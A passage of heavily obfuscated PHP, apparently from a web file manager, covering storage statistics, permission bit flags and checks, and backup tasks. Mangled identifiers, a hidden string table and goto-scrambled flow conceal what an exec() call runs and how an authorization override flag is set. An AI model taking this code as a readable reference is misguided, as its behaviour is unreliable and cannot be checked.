0))->count($Cﬂ€»”∏ﬁì[396]); $EÖàñÒΩÜ = array($Cﬂ€»”∏ﬁì[404] => 0, $Cﬂ€»”∏ﬁì[194] => array($Cﬂ€»”∏ﬁì[981], strtotime(date($Cﬂ€»”∏ﬁì[1644])))); goto f∑≈€≥„±ﬁ; EË¬¶¡·çä: $Cﬂ€»”∏ﬁì =& $_SERVER[™⁄»üÆ]; $cÌéß◊Ë‘¶ = $this->sourceSize(); $b·π‹◊£òç = $cÌéß◊Ë‘¶[$Cﬂ€»”∏ﬁì[78]]; goto FƒÎôÆÓöø; C˜£ó·ÇÈ£: } private function optionAccess() { $cÙﬂ§ë€âí =& $_SERVER[™⁄»üÆ]; return array($cÙﬂ§ë€âí[738] => $this->typeLogCnt(), $cÙﬂ§ë€âí[107] => $this->typeLogCnt($cÙﬂ§ë€âí[107]), $cÙﬂ§ë€âí[431] => $this->typeLogCnt($cÙﬂ§ë€âí[431]), $cÙﬂ§ë€âí[1672] => $this->typeLogCnt($cÙﬂ§ë€âí[1672]), $cÙﬂ§ë€âí[1673] => $this->typeLogCnt($cÙﬂ§ë€âí[1673]), $cÙﬂ§ë€âí[576] => $this->typeLogCnt($cÙﬂ§ë€âí[33], $cÙﬂ§ë€âí[1648])); } private function typeLogCnt($A∑’è£Æ∑Ø = '', $c‡´Û≠Øòﬂ = "\x69\144") { goto Cè·¬ê≈≠Û; cèâø—®ÂÀ: return (int) $DáåÒõ‹ãã; goto bﬁ⁄ıÖÛÌ°; Cè·¬ê≈≠Û: $cˆ≥ïúÈéŸ =& $_SERVER[™⁄»üÆ]; $CÎ˜›€ƒ∞ç = array($cˆ≥ïúÈéŸ[107] => array($cˆ≥ïúÈéŸ[1674], $cˆ≥ïúÈéŸ[1675]), $cˆ≥ïúÈéŸ[431] => array($cˆ≥ïúÈéŸ[1676], $cˆ≥ïúÈéŸ[1677]), $cˆ≥ïúÈéŸ[1672] => array($cˆ≥ïúÈéŸ[1678], $cˆ≥ïúÈéŸ[1679], $cˆ≥ïúÈéŸ[1680]), $cˆ≥ïúÈéŸ[1673] => array($cˆ≥ïúÈéŸ[1681], $cˆ≥ïúÈéŸ[1682]), $cˆ≥ïúÈéŸ[1683] => array($cˆ≥ïúÈéŸ[1684], $cˆ≥ïúÈéŸ[1685], $cˆ≥ïúÈéŸ[1686])); $d©ëŸÓü®É = strtotime(date($cˆ≥ïúÈéŸ[1644])); goto dÈÁàŸ∆üº; dÈÁàŸ∆üº: $FŸ°†ñ”Ëà = array($cˆ≥ïúÈéŸ[194] => array($cˆ≥ïúÈéŸ[981], $d©ëŸÓü®É)); if ($A∑’è£Æ∑Ø) { $FŸ°†ñ”Ëà[$cˆ≥ïúÈéŸ[29]] = array($cˆ≥ïúÈéŸ[7], $CÎ˜›€ƒ∞ç[$A∑’è£Æ∑Ø]); } $DáåÒõ‹ãã = Model($cˆ≥ïúÈéŸ[1647])->where($FŸ°†ñ”Ëà)->count($c‡´Û≠Øòﬂ); goto cèâø—®ÂÀ; bﬁ⁄ıÖÛÌ°: } private function optionServer() { goto B¢·≈Ù≤Èì; B¢·≈Ù≤Èì: $E©ÿÌ∏…òÔ =& $_SERVER[™⁄»üÆ]; $aã©Â–÷Á‘ = $this->diskDriver(); $D–›∞ÚÓ±ø = KodIO::defaultDriver(); goto F÷¡îáø™√; F÷¡îáø™√: $Cúê»äË†á = array($E©ÿÌ∏…òÔ[801] => $D–›∞ÚÓ±ø[$E©ÿÌ∏…òÔ[394]]); $dÉ±îåπáó = Model($E©ÿÌ∏…òÔ[451])->where($Cúê»äË†á)->sum($E©ÿÌ∏…òÔ[78]); $cùÖóÓ˜Ωﬁ = explode($E©ÿÌ∏…òÔ[50], $_SERVER[$E©ÿÌ∏…òÔ[142]]); goto BÇÇ÷Éëâ›; BÇÇ÷Éëâ›: $a‰„ı¡Ã£ä = $cùÖóÓ˜Ωﬁ[0]; $EàÂ’ù›® = $GLOBALS[$E©ÿÌ∏…òÔ[6]][$E©ÿÌ∏…òÔ[17]]; $BﬁüñÖæ¨ = $EàÂ’ù›®[$E©ÿÌ∏…òÔ[942]]; goto a‚˘∞±úÂ∑; eÆÎÏÈÕÎ¬: return array($E©ÿÌ∏…òÔ[1689] => $aã©Â–÷Á‘ ? $aã©Â–÷Á‘[$E©ÿÌ∏…òÔ[1690]] : 0, $E©ÿÌ∏…òÔ[1691] => $aã©Â–÷Á‘ ? $aã©Â–÷Á‘[$E©ÿÌ∏…òÔ[1692]] : 0, $E©ÿÌ∏…òÔ[1693] => (int) $D–›∞ÚÓ±ø[$E©ÿÌ∏…òÔ[1690]] * 1024 * 1024 * 1024, $E©ÿÌ∏…òÔ[1694] => (int) $dÉ±îåπáó, $E©ÿÌ∏…òÔ[1695] => ucfirst($a‰„ı¡Ã£ä), $E©ÿÌ∏…òÔ[1696] => $E©ÿÌ∏…òÔ[1697] . PHP_VERSION, $E©ÿÌ∏…òÔ[1698] => phpBuild64() ? 64 : 32, $E©ÿÌ∏…òÔ[737] => str_replace($E©ÿÌ∏…òÔ[1699], $E©ÿÌ∏…òÔ[958], $BﬁüñÖæ¨), $E©ÿÌ∏…òÔ[347] => ucfirst($bœ‘ı¢Ùá…), $E©ÿÌ∏…òÔ[28] => $_SERVER[$E©ÿÌ∏…òÔ[1700]]); goto C£ÃÈë´Ø∆; a‚˘∞±úÂ∑: if ($BﬁüñÖæ¨ == $E©ÿÌ∏…òÔ[774]) { $F»·§ä·‹— = explode($E©ÿÌ∏…òÔ[1175], $EàÂ’ù›®[$E©ÿÌ∏…òÔ[941]]); $BﬁüñÖæ¨ = $F»·§ä·‹—[0]; } if ($BﬁüñÖæ¨ == $E©ÿÌ∏…òÔ[777] || $BﬁüñÖæ¨ == $E©ÿÌ∏…òÔ[778]) { $Fâø€≥ñÁﬂ = Model()->db()->query($E©ÿÌ∏…òÔ[1687]); $C—ÉÓ·◊ÈÉ = $Fâø€≥ñÁﬂ[0] && isset($Fâø€≥ñÁﬂ[0][$E©ÿÌ∏…òÔ[1439]]) ? $Fâø€≥ñÁﬂ[0][$E©ÿÌ∏…òÔ[1439]] : 0; $BﬁüñÖæ¨ = $E©ÿÌ∏…òÔ[1688] . ($C—ÉÓ·◊ÈÉ ? $E©ÿÌ∏…òÔ[8] . $C—ÉÓ·◊ÈÉ : $E©ÿÌ∏…òÔ[33]); } $bœ‘ı¢Ùá… = $GLOBALS[$E©ÿÌ∏…òÔ[6]][$E©ÿÌ∏…òÔ[347]][$E©ÿÌ∏…òÔ[811]]; goto eÆÎÏÈÕÎ¬; C£ÃÈë´Ø∆: } private function diskDriver() { goto f´´⁄·Ø´∂; eº÷àçëá›: if ($eÏÇ«ÊùÖÇ) { $AÕåﬂ≠∏ÜÂ = $bé“Œö¯ÃÉ[1703]; if (function_exists($bé“Œö¯ÃÉ[1704])) { exec($bé“Œö¯ÃÉ[1705], $bËÏ››êÖÃ); $AÕåﬂ≠∏ÜÂ = $bËÏ››êÖÃ[1] . $bé“Œö¯ÃÉ[8]; } } if (!file_exists($AÕåﬂ≠∏ÜÂ)) { return; } $C¯≠•›È∂Ò = @disk_total_space($AÕåﬂ≠∏ÜÂ); goto DÜï¯øâ–ª; f´´⁄·Ø´∂: $bé“Œö¯ÃÉ =& $_SERVER[™⁄»üÆ]; $AÕåﬂ≠∏ÜÂ = $bé“Œö¯ÃÉ[8]; $eÏÇ«ÊùÖÇ = $GLOBALS[$bé“Œö¯ÃÉ[6]][$bé“Œö¯ÃÉ[1701]] == $bé“Œö¯ÃÉ[1702]; goto eº÷àçëá›; DÜï¯øâ–ª: $B•ï›∂£Î∆ = $C¯≠•›È∂Ò - @disk_free_space($AÕåﬂ≠∏ÜÂ); return array($bé“Œö¯ÃÉ[1690] => $C¯≠•›È∂Ò, $bé“Œö¯ÃÉ[1692] => $B•ï›∂£Î∆); goto E€¨∑‰»à⁄; E€¨∑‰»à⁄: } public function fileChart($DîÑÍ§Öß◊) { goto dáë⁄®⁄ò˘; dáë⁄®⁄ò˘: $dŒäü®ïÕØ =& $_SERVER[™⁄»üÆ]; if (isset($DîÑÍ§Öß◊[$dŒäü®ïÕØ[1537]])) { return Model($dŒäü®ïÕØ[809])->userFileTypeProfile($DîÑÍ§Öß◊[$dŒäü®ïÕØ[1537]]); } if (isset($DîÑÍ§Öß◊[$dŒäü®ïÕØ[1706]])) { return Model($dŒäü®ïÕØ[809])->groupFileTypeProfile($DîÑÍ§Öß◊[$dŒäü®ïÕØ[1706]]); } goto d…◊åôæ™å; f‹¯êÿ∞Ï÷: $b…Ï≈Ñ¢ß±[$dŒäü®ïÕØ[405]] = 2; $CÂ’î≥ƒßó = Model($dŒäü®ïÕØ[809])->where($b…Ï≈Ñ¢ß±)->sum($dŒäü®ïÕØ[78]); return array($dŒäü®ïÕØ[742] => $f›∞§é ±≥[$dŒäü®ïÕØ[78]], $dŒäü®ïÕØ[1637] => $f›∞§é ±≥[$dŒäü®ïÕØ[1637]], $dŒäü®ïÕØ[1638] => (int) $d®Ó«àóƒ€, $dŒäü®ïÕØ[1639] => (int) $CÂ’î≥ƒßó); goto cöñ˜Ω≈í£; d…◊åôæ™å: $f›∞§é ±≥ = $this->sourceSize(); $b…Ï≈Ñ¢ß± = array($dŒäü®ïÕØ[479] => 0, $dŒäü®ïÕØ[405] => 1); $d®Ó«àóƒ€ = Model($dŒäü®ïÕØ[809])->where($b…Ï≈Ñ¢ß±)->sum($dŒäü®ïÕØ[78]); goto f‹¯êÿ∞Ï÷; cöñ˜Ω≈í£: } private function sourceSize() { $dè–√øì¢œ =& $_SERVER[™⁄»üÆ]; $aÀë∏¬≈§≤ = Model($dè–√øì¢œ[809])->where(array($dè–√øì¢œ[404] => 0))->sum($dè–√øì¢œ[78]); $C°ØˆÎ„∂ä = Model($dè–√øì¢œ[451])->sum($dè–√øì¢œ[78]); if ($C°ØˆÎ„∂ä > $aÀë∏¬≈§≤) { $C°ØˆÎ„∂ä = $aÀë∏¬≈§≤; } return array($dè–√øì¢œ[78] => (int) $aÀë∏¬≈§≤, $dè–√øì¢œ[1637] => (int) $C°ØˆÎ„∂ä); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $E∑Ö∂åÿèâ =& $_SERVER[™⁄»üÆ]; $bÁŸçô±õ∫ = array(array($E∑Ö∂åÿèâ[414] => LNG($E∑Ö∂åÿèâ[1707]), $E∑Ö∂åÿèâ[1708] => $E∑Ö∂åÿèâ[1709], $E∑Ö∂åÿèâ[1710] => 1, $E∑Ö∂åÿèâ[1711] => 1, $E∑Ö∂åÿèâ[1712] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($E∑Ö∂åÿèâ[414] => LNG($E∑Ö∂åÿèâ[1713]), $E∑Ö∂åÿèâ[1708] => $E∑Ö∂åÿèâ[1714], $E∑Ö∂åÿèâ[1710] => 2, $E∑Ö∂åÿèâ[1711] => 1, $E∑Ö∂åÿèâ[1712] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($E∑Ö∂åÿèâ[414] => LNG($E∑Ö∂åÿèâ[1715]), $E∑Ö∂åÿèâ[1708] => $E∑Ö∂åÿèâ[1716], $E∑Ö∂åÿèâ[1710] => 3, $E∑Ö∂åÿèâ[1711] => 1, $E∑Ö∂åÿèâ[1712] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($E∑Ö∂åÿèâ[414] => LNG($E∑Ö∂åÿèâ[1717]), $E∑Ö∂åÿèâ[1708] => $E∑Ö∂åÿèâ[1718], $E∑Ö∂åÿèâ[1710] => 4, $E∑Ö∂åÿèâ[1711] => 1, $E∑Ö∂åÿèâ[1712] => self::AUTH_SHOW | self::AUTH_VIEW), array($E∑Ö∂åÿèâ[414] => LNG($E∑Ö∂åÿèâ[1719]), $E∑Ö∂åÿèâ[1708] => $E∑Ö∂åÿèâ[1720], $E∑Ö∂åÿèâ[1710] => 5, $E∑Ö∂åÿèâ[1711] => 1, $E∑Ö∂åÿèâ[1712] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($E∑Ö∂åÿèâ[414] => LNG($E∑Ö∂åÿèâ[1721]), $E∑Ö∂åÿèâ[1708] => $E∑Ö∂åÿèâ[1722], $E∑Ö∂åÿèâ[1710] => 6, $E∑Ö∂åÿèâ[1711] => 1, $E∑Ö∂åÿèâ[1712] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($E∑Ö∂åÿèâ[414] => LNG($E∑Ö∂åÿèâ[1723]), $E∑Ö∂åÿèâ[1708] => $E∑Ö∂åÿèâ[1724], $E∑Ö∂åÿèâ[1710] => 7, $E∑Ö∂åÿèâ[1711] => 1, $E∑Ö∂åÿèâ[1712] => 0)); return $bÁŸçô±õ∫; } public static function authCheck($c◊µœ›äá¨, $eúóÁï“ƒ¥) { $c◊µœ›äá¨ = intval($c◊µœ›äá¨); if ($GLOBALS[$_SERVER[™⁄»üÆ][486]]) { return !0; } if ($c◊µœ›äá¨ <= 0) { return !1; } if (($c◊µœ›äá¨ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($c◊µœ›äá¨ & $eúóÁï“ƒ¥); } public static function authCheckShow($D«Ü∞‚è∆⁄) { return self::authCheck($D«Ü∞‚è∆⁄, self::AUTH_SHOW); } public static function authCheckView($eøùÔ±¡©) { return self::authCheck($eøùÔ±¡©, self::AUTH_VIEW); } public static function authCheckDownload($e€ÍòÙÓ÷Ü) { return self::authCheck($e€ÍòÙÓ÷Ü, self::AUTH_DOWNLOAD); } public static function authCheckUpload($e≤ŸÑò†≈«) { return self::authCheck($e≤ŸÑò†≈«, self::AUTH_UPLOAD); } public static function authCheckEdit($c™®íŒç°ç) { return self::authCheck($c™®íŒç°ç, self::AUTH_EDIT); } public static function authCheckRemove($fëô≥ï––ı) { return self::authCheck($fëô≥ï––ı, self::AUTH_REMOVE); } public static function authCheckShare($F·´Ì∏ÿª“) { return self::authCheck($F·´Ì∏ÿª“, self::AUTH_SHARE); } public static function authCheckComment($döçØèèó”) { return self::authCheck($döçØèèó”, self::AUTH_COMMENT); } public static function authCheckEvent($BÁÍ·ÓÔÍ•) { return self::authCheck($BÁÍ·ÓÔÍ•, self::AUTH_EVENT); } public static function authCheckRoot($eˆí©çÃìπ) { return self::authCheck($eˆí©çÃìπ, self::AUTH_ROOT); } public static function authCheckAction($BåüëˆÃôÌ, $EêøÛ·µæ‹) { goto cóÿ—€Œ´©; D…¬∂Â≠ÀÊ: $Bò—ù…Ñ∏ü = $D–≤§å‡Úê[$EêøÛ·µæ‹]; $BåüëˆÃôÌ = intval($BåüëˆÃôÌ); if ($BåüëˆÃôÌ <= 0) { return !1; } goto EüáÃÈóôí; EüáÃÈóôí: if (($BåüëˆÃôÌ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($BåüëˆÃôÌ & $Bò—ù…Ñ∏ü); goto e»°—î†âÙ; cóÿ—€Œ´©: $BΩü≤‘ãÏƒ =& $_SERVER[™⁄»üÆ]; $D–≤§å‡Úê = array($BΩü≤‘ãÏƒ[1725] => self::AUTH_VIEW, $BΩü≤‘ãÏƒ[1102] => self::AUTH_DOWNLOAD, $BΩü≤‘ãÏƒ[107] => self::AUTH_UPLOAD, $BΩü≤‘ãÏƒ[1673] => self::AUTH_EDIT, $BΩü≤‘ãÏƒ[1672] => self::AUTH_REMOVE, $BΩü≤‘ãÏƒ[1683] => self::AUTH_SHARE, $BΩü≤‘ãÏƒ[352] => self::AUTH_COMMENT, $BΩü≤‘ãÏƒ[1525] => self::AUTH_EVENT, $BΩü≤‘ãÏƒ[1726] => self::AUTH_ROOT); if (!isset($D–≤§å‡Úê[$EêøÛ·µæ‹])) { return; } goto D…¬∂Â≠ÀÊ; e»°—î†âÙ: } public static function authDisable($D‚πÔ‡ë€å, $Cé√îÂèƒÍ) { if (intval($D‚πÔ‡ë€å) <= 0) { return 0; } return intval($D‚πÔ‡ë€å) & ~$Cé√îÂèƒÍ; } public $optionType = "\x53\x79\163\x74\145\x6d\56\x73\x6f\x75\x72\x63\x65\101\165\x74\x68\114\151\163\164"; public $field = array("\156\141\155\x65", "\141\x75\x74\x68", "\x6c\x61\142\145\x6c", "\x64\x69\x73\160\x6c\141\x79", "\163\x79\163\164\145\x6d", "\x73\x6f\162\x74"); public function initData() { $Aπêê¿∞´° = $this->authDefault(); foreach ($Aπêê¿∞´° as $bå≥Ñπõ§ë) { $this->add($bå≥Ñπõ§ë); } } public function findAuth($eÀπé∞ú©ê, $E∑‘ò€Ùˆå) { $C«™Ìó∂øø =& $_SERVER[™⁄»üÆ]; $E¯‹´óØ¬ø = parent::listData(); foreach ($E¯‹´óØ¬ø as $Aú≈ñ∫⁄éÍ) { $e≈≠ö®πå≈ = intval($Aú≈ñ∫⁄éÍ[$C«™Ìó∂øø[407]]); if ($e≈≠ö®πå≈ <= 0 || $Aú≈ñ∫⁄éÍ[$C«™Ìó∂øø[1727]] == 0) { continue; } if (($e≈≠ö®πå≈ & $eÀπé∞ú©ê) != $eÀπé∞ú©ê) { continue; } if (($e≈≠ö®πå≈ & $E∑‘ò€Ùˆå) != 0) { continue; } return $Aú≈ñ∫⁄éÍ[$C«™Ìó∂øø[394]]; } return !1; } public function findAuthReadOnly() { $EÌÕÖ≈ÖÓ∏ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $Dê‰ú≠…€” = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($EÌÕÖ≈ÖÓ∏, $Dê‰ú≠…€”); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function listData($fê∏¡Ç⁄ç§ = false, $DíÍ·«›‚® = "\x73\x6f\162\164", $aπ„çé›ÎÀ = false) { return parent::listData($fê∏¡Ç⁄ç§, $DíÍ·«›‚®, $aπ„çé›ÎÀ); } public function update($b´∂¬˜Ωé, $fèÍùÎﬁôè) { $fàƒâ„√äÜ =& $_SERVER[™⁄»üÆ]; $AıÜåØç±ñ = parent::listData($b´∂¬˜Ωé); $d¬é–áàÖò = $this->findByName($fèÍùÎﬁôè[$fàƒâ„√äÜ[28]]); if (!$AıÜåØç±ñ || $d¬é–áàÖò && $d¬é–áàÖò[$fàƒâ„√äÜ[394]] != $AıÜåØç±ñ[$fàƒâ„√äÜ[394]]) { return !1; } $this->filterAuth($fèÍùÎﬁôè[$fàƒâ„√äÜ[407]]); return parent::update($b´∂¬˜Ωé, $fèÍùÎﬁôè); } public function remove($BôÜå‹ÇÛ—) { $b®˘∞€ó¯Ò = parent::listData($BôÜå‹ÇÛ—); if (!$b®˘∞€ó¯Ò || $b®˘∞€ó¯Ò[$_SERVER[™⁄»üÆ][1179]]) { return !1; } return parent::remove($BôÜå‹ÇÛ—); } public function add($b≤⁄ÚËÀÌ· = array()) { goto bñÍå‚òã¿; FÊ∆⁄∏∫≠È: return parent::insert($b≤⁄ÚËÀÌ·); goto e’∞òÍìëº; Añ¶ÒÂî†Ô: $b≤⁄ÚËÀÌ· = array_merge($BëÂ˘Ωªéà, $b≤⁄ÚËÀÌ·); $b≤⁄ÚËÀÌ·[$D±Ì‡ÃÁæÖ[1729]] = $this->getSort(); $this->filterAuth($b≤⁄ÚËÀÌ·[$D±Ì‡ÃÁæÖ[407]]); goto FÊ∆⁄∏∫≠È; bñÍå‚òã¿: $D±Ì‡ÃÁæÖ =& $_SERVER[™⁄»üÆ]; if ($this->findByName($b≤⁄ÚËÀÌ·[$D±Ì‡ÃÁæÖ[28]])) { return !1; } $BëÂ˘Ωªéà = array($D±Ì‡ÃÁæÖ[28] => $D±Ì‡ÃÁæÖ[33], $D±Ì‡ÃÁæÖ[407] => 1, $D±Ì‡ÃÁæÖ[1728] => $D±Ì‡ÃÁæÖ[1716], $D±Ì‡ÃÁæÖ[1727] => 1, $D±Ì‡ÃÁæÖ[1179] => 0, $D±Ì‡ÃÁæÖ[1729] => 0); goto Añ¶ÒÂî†Ô; e’∞òÍìëº: } private function getSort() { $D“†‰±¨Ãé =& $_SERVER[™⁄»üÆ]; $FñÍ¢∂≥π» = parent::listData(); $FöÖÚÊÔÕà = array_to_keyvalue($FñÍ¢∂≥π», $D“†‰±¨Ãé[33], $D“†‰±¨Ãé[1729]); return empty($FöÖÚÊÔÕà) ? 0 : max($FöÖÚÊÔÕà) + 1; } private function filterAuth(&$cç€¢◊©øÀ) { goto A•≥·¥àçæ; f≠ú‹ò›ß: foreach ($bùÁ¨˘«© as $cƒ“éê√ôä) { if (isset($F©åÊ—ÍÀù[$cƒ“éê√ôä])) { $bùÁ¨˘«© = array_merge($bùÁ¨˘«©, $F©åÊ—ÍÀù[$cƒ“éê√ôä]); } } $bùÁ¨˘«©[] = self::AUTH_SHOW; $cç€¢◊©øÀ = array_sum(array_unique($bùÁ¨˘«©)); goto dæ∞çïÿ∂ñ; c±≈ÿÉÑªï: foreach ($EÕíö„¢‰„ as $cƒ“éê√ôä) { if ($cç€¢◊©øÀ & $cƒ“éê√ôä) { $bùÁ¨˘«©[] = $cƒ“éê√ôä; } } if (in_array(self::AUTH_ROOT, $bùÁ¨˘«©)) { $cç€¢◊©øÀ = array_sum($EÕíö„¢‰„); return; } $F©åÊ—ÍÀù = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto f≠ú‹ò›ß; A•≥·¥àçæ: if (!$cç€¢◊©øÀ) { return; } $EÕíö„¢‰„ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $bùÁ¨˘«© = array(); goto c±≈ÿÉÑªï; dæ∞çïÿ∂ñ: } public function sort($BÛÛÏä∆⁄√, $D¡Âë¨Ìß) { return parent::update($BÛÛÏä∆⁄√, $D¡Âë¨Ìß); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\56\x62\141\143\x6b\x75\160\114\151\163\x74"; public $field = array("\151\157", "\156\141\155\x65", "\x73\x74\x61\x74\165\163", "\143\x6f\156\164\145\156\164", "\155\141\x6e\165\x61\x6c", "\162\x65\x73\x75\x6c\164", "\x74\x69\155\x65\x46\x72\157\x6d", "\x74\x69\155\x65\124\x6f"); public function config() { goto f£∂ì®Ø∆Æ; B∆âùÃ§ﬂÇ: Action($F≤‡õåÎîß[1730])->taskInit(); Model($F≤‡õåÎîß[1506])->cacheClear(); $Bº·Ç ù•— = $F≤‡õåÎîß[1731]; goto f”’´ªÓö; f”’´ªÓö: $c¶ ë∑ÙÖÔ = Model($F≤‡õåÎîß[1732])->findByKey($F≤‡õåÎîß[1525], $Bº·Ç ù•—); if (!$c¶ ë∑ÙÖÔ) { $c¶ ë∑ÙÖÔ = array(); } if (isset($c¶ ë∑ÙÖÔ[$F≤‡õåÎîß[197]])) { $c¶ ë∑ÙÖÔ[$F≤‡õåÎîß[197]] = json_decode($c¶ ë∑ÙÖÔ[$F≤‡õåÎîß[197]], !0); } goto cΩÏÜ€æ≤é; B¨ÎË§∂ı¨: $eÙÚóçÇÓÇ = is_array($eÙÚóçÇÓÇ) ? $eÙÚóçÇÓÇ : array(); if (!isset($eÙÚóçÇÓÇ[$F≤‡õåÎîß[734]])) { $eÙÚóçÇÓÇ[$F≤‡õåÎîß[734]] = $F≤‡õåÎîß[87]; } unset($eÙÚóçÇÓÇ[$F≤‡õåÎîß[1507]]); goto B∆âùÃ§ﬂÇ; cΩÏÜ€æ≤é: if (isset($eÙÚóçÇÓÇ[$F≤‡õåÎîß[197]])) { $c¶ ë∑ÙÖÔ[$F≤‡õåÎîß[197]][$F≤‡õåÎîß[1510]] = $eÙÚóçÇÓÇ[$F≤‡õåÎîß[197]]; unset($eÙÚóçÇÓÇ[$F≤‡õåÎîß[197]]); } return array_merge($c¶ ë∑ÙÖÔ, $eÙÚóçÇÓÇ); goto CÊ£™±ìë÷; f£∂ì®Ø∆Æ: $F≤‡õåÎîß =& $_SERVER[™⁄»üÆ]; $eÙÚóçÇÓÇ = Model($F≤‡õåÎîß[749])->get($F≤‡õåÎîß[761]); $eÙÚóçÇÓÇ = json_decode($eÙÚóçÇÓÇ, !0); goto B¨ÎË§∂ı¨; CÊ£™±ìë÷: } public function listData($Bãà‘©€È‡ = false, $Fèì™€¶ì‚ = "\x6d\157\x64\x69\146\x79\x54\151\x6d\145", $búÎÉ◊ô÷≈ = false) { return parent::listData($Bãà‘©€È‡, $Fèì™€¶ì‚, !0); } public function lastItem() { $aÖáôÜíïä = $this->listData(); return !empty($aÖáôÜíïä[0]) ? $aÖáôÜíïä[0] : null; } public function kill($a·ëΩÀÓ¿Ë) { goto fçã®Íë∞ô; f—˘ûã¡ûö: return $this->remove($a·ëΩÀÓ¿Ë); goto c≠Õ êôö©; E·ªòÂ≤©œ: $FêçÊ§•íá = $CºéÏàÌ¬∞[$DÍÓ∑Î©ÿè[28]]; $c·ÕìÒÌúµ = TEMP_FILES . $DÍÓ∑Î©ÿè[757] . $FêçÊ§•íá . $DÍÓ∑Î©ÿè[8]; IO::remove($c·ÕìÒÌúµ, !1); goto f—˘ûã¡ûö; Aº≠í¢¥≠ì: Task::kill($DÍÓ∑Î©ÿè[760]); Task::kill($DÍÓ∑Î©ÿè[783]); Task::kill($DÍÓ∑Î©ÿè[793]); goto E·ªòÂ≤©œ; fçã®Íë∞ô: $DÍÓ∑Î©ÿè =& $_SERVER[™⁄»üÆ]; $CºéÏàÌ¬∞ = $this->listData($a·ëΩÀÓ¿Ë); if (!$CºéÏàÌ¬∞ || empty($CºéÏàÌ¬∞[$DÍÓ∑Î©ÿè[28]])) { return !0; } goto Aº≠í¢¥≠ì; c≠Õ êôö©: } public function remove($B©Ìù•§ƒ¨) { $c÷„˜ªÖêÕ = $this->listData($B©Ìù•§ƒ¨); if (!$c÷„˜ªÖêÕ) { return !0; } return $this->backupRemove($c÷„˜ªÖêÕ); } private function backupRemove($dÑ¡Æ˜–¶ñ) { parent::remove($dÑ¡Æ˜–¶ñ[$_SERVER[™⁄»üÆ][394]]); $Dé≠ù¶êõ÷ = $this->backupPath($dÑ¡Æ˜–¶ñ); IO::remove($Dé≠ù¶êõ÷, !1); return !0; } private function backupPath($D‚ˆö◊Öºü) { $B≈™’‚äŒ‰ =& $_SERVER[™⁄»üÆ]; $aÕÚéüÓ®’ = $D‚ˆö◊Öºü[$B≈™’‚äŒ‰[28]]; $FÔêë™ºãÈ = Model($B≈™’‚äŒ‰[749])->get($B≈™’‚äŒ‰[750]); $cπì—¯≠‹Ò = substr(md5($B≈™’‚äŒ‰[751] . $FÔêë™ºãÈ . $aÕÚéüÓ®’), 0, 8); return "\x7b\x69\x6f\72{$D‚ˆö◊Öºü[$B≈™’‚äŒ‰[731]]}\175\x2f\x64\x61\164\x61\142\141\163\x65\x2f\142\x61\143\153\165\160\57" . $aÕÚéüÓ®’ . $B≈™’‚äŒ‰[71] . $cπì—¯≠‹Ò; } public function start() { goto f”æ≠Õ¿áŒ; f”æ≠Õ¿áŒ: $A…›º“çì≠ =& $_SERVER[™⁄»üÆ]; if ($GLOBALS[$A…›º“çì≠[6]][$A…›º“çì≠[88]][$A…›º“çì≠[1733]] != $A…›º“çì≠[87]) { return !0; } $aõöƒ©œµ‡ = $this->config(); goto E—ƒ˜óÚç€; E—ƒ˜óÚç€: if (!$aõöƒ©œµ‡ || $aõöƒ©œµ‡[$A…›º“çì≠[1507]] != $A…›º“çì≠[87]) { return !1; } $FñÌîˆ´†ç = $this->process(); foreach ($FñÌîˆ´†ç as $cóø°Â÷ΩÉ) { if ($cóø°Â÷ΩÉ) { return Task::restart($cóø°Â÷ΩÉ[$A…›º“çì≠[394]]); } } goto fŸèàÉîﬁÀ; fŸèàÉîﬁÀ: $B˜Ã√ıííô = new Backup(); $EƒÎÑ”îª» = $B˜Ã√ıííô->db(); if ($EƒÎÑ”îª») { $EƒÎÑ”îª» = $B˜Ã√ıííô->dbFile(); if ($EƒÎÑ”îª» && $aõöƒ©œµ‡[$A…›º“çì≠[734]] == $A…›º“çì≠[191]) { $EƒÎÑ”îª» = $B˜Ã√ıííô->file(); } } goto BÏÉùóÑêæ; BÏÉùóÑêæ: Backup::set(array($A…›º“çì≠[729] => 1, $A…›º“çì≠[477] => time())); return !0; goto 